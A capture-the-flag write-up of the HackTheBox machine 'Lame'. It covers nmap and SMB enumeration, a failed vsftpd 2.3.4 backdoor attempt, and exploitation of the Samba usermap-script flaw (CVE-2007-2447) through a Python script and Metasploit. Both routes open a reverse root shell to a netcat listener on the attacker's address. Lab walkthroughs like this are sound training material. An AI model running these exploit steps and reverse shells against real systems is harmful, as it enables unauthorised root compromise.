# Lame by ch4p
![alt text](https://i.imgur.com/mLVb0NZ.png)

## Initial Recon
The initial nmap scan of the box shows that there are three services for us to investigate - ftp, ssh and smb
```sh
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## FTP
The ftp service on this box has anonymous login enabled which allows us to connect without authenticating
```sh
root@kali:~# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```
Unfortunately there are no files on the ftp server for us to look at, we could try to see if there are any exploits for the version of vsftpd the service uses
```sh
root@kali:~# searchsploit vsftpd 2
---------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                              |  Path
                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption              | exploits/linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)              | exploits/windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)              | exploits/windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                            | exploits/linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                      | exploits/unix/remote/17491.rb
---------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```
We can try the [vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor) exploit and see if it works
```sh
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
In this case, it doesn't.

## SSH
Without a username at least there isn't much we can do with SSH for now, we do have the version of OpenSSH it's using but there are no vulnerabilities we're able to exploit at this stage.

## SMB
We can use a tool called smbmap to enumerate the samba shares on the server which will hopefully give us some more info and possibly an indication of where to go next
```sh
root@kali:~# smbmap -H 10.10.10.3 -R
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.3...
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        .\
        dr--r--r--                0 Mon Apr  6 10:35:20 2020    .
        dw--w--w--                0 Sun May 20 14:36:11 2012    ..
        -w--w--w--                0 Mon Apr  6 07:46:10 2020    5147.jsvc_up
        dr--r--r--                0 Mon Apr  6 07:45:03 2020    .ICE-unix
        dr--r--r--                0 Mon Apr  6 07:45:28 2020    .X11-unix
        -w--w--w--               11 Mon Apr  6 07:45:28 2020    .X0-lock
        .\.X11-unix\
        dr--r--r--                0 Mon Apr  6 07:45:28 2020    .
        dr--r--r--                0 Mon Apr  6 10:35:20 2020    ..
        -r--r--r--                0 Mon Apr  6 07:45:28 2020    X0
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```
The H flag is used for specifying the hostname and the R flag is used to recursively list shares as we can see with tmp.

File wise there's nothing that jumps out but the version number is leaked which we can use to see if there are any exploits available
```sh
root@kali:~# searchsploit samba 3.0.20
---------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                              |  Path
                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasp | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                       | exploits/linux/remote/7701.txt
---------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

## Exploiting SMB
The exploit above relates to [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) which allows us to abuse the non-default username map script and achieve unauthenticated command execution.

We can exploit this using a [python script](https://github.com/amriunix/CVE-2007-2447) or [metasploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script), both of which should achieve the same outcome.

*Python Script*
Before running the script we'll need to setup a netcat listener
```sh
root@kali:~# nc -lvnp 4444
listening on [any] 4444 ...
```
Then we can run the script
```sh
root@kali:~/htb/lame/CVE-2007-2447# python usermap_script.py 10.10.10.3 139 10.10.14.7 4444
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```
And get a root shell!
```sh
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.3] 40546
whoami
root
id
uid=0(root) gid=0(root)
pwd
/
```

*Metasploit*
Before running the exploit we need to locate the module and set the options
```sh
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```
We can then let metasploit do its thing
```sh
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.7:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo pjl2fzMCHYRY995e;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "pjl2fzMCHYRY995e\r\n"
[*] Matching...
[*] A is input...
```
And we get a root shell!
```sh
[*] Command shell session 1 opened (10.10.14.7:4444 -> 10.10.10.3:47530) at 2020-04-09 13:58:12 -0400

whoami
root
id
uid=0(root) gid=0(root)
pwd
/
```
Once we have a root shell it's trivial to find the root and user flags to complete the box.

## Alternate Route - distccd 
